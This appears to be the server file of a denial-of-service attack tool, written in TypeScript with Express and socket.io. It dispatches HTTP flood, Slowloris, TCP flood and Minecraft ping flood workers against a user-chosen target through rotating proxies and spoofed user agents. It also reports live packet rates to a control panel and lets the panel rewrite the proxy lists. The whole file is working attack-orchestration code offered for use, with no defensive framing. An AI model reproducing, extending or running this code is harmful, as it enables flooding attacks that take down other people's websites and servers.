import express from "express";
import { createServer } from "http";
import { dirname, join } from "path";
import { readFileSync, writeFileSync } from "fs";
import { Server } from "socket.io";
import { fileURLToPath } from "url";
import { Worker } from "worker_threads";

import { currentPath, loadProxies, loadUserAgents } from "./fileLoader";
import { AttackMethod } from "./lib";
import { filterProxies } from "./proxyUtils";
import bodyParser from "body-parser";

// Define the workers based on attack type
const attackWorkers: { [key in AttackMethod]: string } = {
  http_flood: "./workers/httpFloodAttack.js",
  http_slowloris: "./workers/httpSlowlorisAttack.js",
  tcp_flood: "./workers/tcpFloodAttack.js",
  minecraft_ping: "./workers/minecraftPingAttack.js",
};

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: {
    origin: "http://localhost:5173",
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type"]
  },
});

const proxies = loadProxies();
const userAgents = loadUserAgents();

console.log("Proxies loaded:", proxies.length);
console.log("User agents loaded:", userAgents.length);

io.on("connection", (socket) => {
  console.log("Client connected");

  socket.emit("stats", {
    pps: 0,
    bots: proxies.length,
    totalPackets: 0,
    log: "🍤 Connected to the server.",
  });

  socket.on("startAttack", (params) => {
    const { target, duration, packetDelay, attackMethod, packetSize } = params;
    const filteredProxies = filterProxies(proxies, attackMethod);
    const attackWorkerFile = attackWorkers[attackMethod];

    if (!attackWorkerFile) {
      socket.emit("stats", {
        log: `❌ Unsupported attack type: ${attackMethod}`,
      });
      return;
    }

    socket.emit("stats", {
      log: `🍒 Using ${filteredProxies.length} filtered proxies to perform attack.`,
      bots: filteredProxies.length,
    });

    const worker = new Worker(join(__dirname, attackWorkerFile), {
      workerData: {
        target,
        proxies: filteredProxies,
        userAgents,
        duration,
        packetDelay,
        packetSize,
      },
    });

    worker.on("message", (message) => socket.emit("stats", message));

    worker.on("error", (error) => {
      console.error(`Worker error: ${error.message}`);
      socket.emit("stats", { log: `❌ Worker error: ${error.message}` });
    });

    worker.on("exit", (code) => {
      console.log(`Worker exited with code ${code}`);
      socket.emit("attackEnd");
    });

    socket["worker"] = worker;
  });

  socket.on("stopAttack", () => {
    const worker = socket["worker"];
    if (worker) {
      worker.terminate();
      socket.emit("attackEnd");
    }
  });

  socket.on("disconnect", () => {
    const worker = socket["worker"];
    if (worker) {
      worker.terminate();
    }
    console.log("Client disconnected");
  });
});

app.get("/configuration", (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173")
  res.setHeader("Content-Type", "application/json");
  const proxiesText = readFileSync(join(currentPath(), "data", "proxies.txt"), "utf-8");
  const uasText = readFileSync(join(currentPath(), "data", "uas.txt"), "utf-8");

  res.send({
    proxies: btoa(proxiesText),
    uas: btoa(uasText),
  })
})

app.options('/configuration', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', 'http://localhost:5173');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.send();
});


app.post("/configuration", bodyParser.json(), (req, res) => {
  res.setHeader("Access-Control-Allow-Methods", "POST");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type")
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173")
  res.setHeader("Content-Type", "application/text");

  // console.log(req.body)

  // atob and btoa are used to avoid the problems in sending data with // characters, etc.
  const proxies = atob(req.body["proxies"]);
  const uas = atob(req.body["uas"]);
  writeFileSync(join(currentPath(), "data", "proxies.txt"), proxies, {
    encoding: "utf-8"
  });
  writeFileSync(join(currentPath(), "data", "uas.txt"), uas, {
    encoding: "utf-8"
  });

  res.send("OK")
})

const PORT = 3000;
httpServer.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
